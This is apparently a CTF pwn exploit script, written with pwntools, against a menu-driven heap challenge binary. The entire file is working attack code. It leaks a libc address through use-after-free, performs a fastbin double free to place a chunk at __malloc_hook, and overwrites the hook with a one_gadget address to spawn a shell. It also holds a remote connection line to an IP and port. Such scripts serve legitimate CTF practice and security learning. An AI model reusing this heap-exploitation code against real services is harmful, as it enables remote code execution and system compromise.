from pwn import*
def add(name,info):
	p.sendlineafter('choice : ','1')
	p.sendafter('name',name + 7 *'\x00')
	p.sendafter('sex','W')
	p.sendafter('information',info)
	##Chunk -> name|sex|info = 0x80 

def show(index):
	p.sendlineafter('choice : ','2')
	p.sendlineafter('index : ',str(index))

def edit(index,info):
	p.sendlineafter('choice : ','3')
	p.sendlineafter('index : ',str(index))
	p.sendline('N')
	p.sendafter('information',info)

def free(index):
	p.sendlineafter('choice : ','4')
	p.sendlineafter('index : ',str(index))
p = remote('123.56.85.29',4807)
p = process('./pwn')
context.log_level = 'debug'
add('0','\x00'*0x70)
add('1','\x00'*0x70)
add('2','\x00'*0x70)
free(0)
show(0)
p.recvline()
main_arena = u64(p.recv(6).ljust(8,'\x00')) -88
malloc_hook = main_arena - 0x10
log.success('Main_Arena:\t' + hex(main_arena))
add('0','\x00'*0x70)
##-----------
free(1)
free(2)
free(1)
p.sendlineafter('choice : ','1')
p.sendafter('name',p64(malloc_hook-0x23))
p.sendafter('sex','W')
p.sendafter('information','\x00'*0x70)
add('2','\x00'*0x70)
add('1','\x00'*0x70)
one_gadget = 0xF1147 + malloc_hook + 0x10- 0x3C4B20
p.sendlineafter('choice : ','1')
p.sendafter('name',p64(one_gadget))
p.sendafter('sex','W')
p.sendafter('information','\x00'*0x70)
p.sendline('1')
p.interactive()
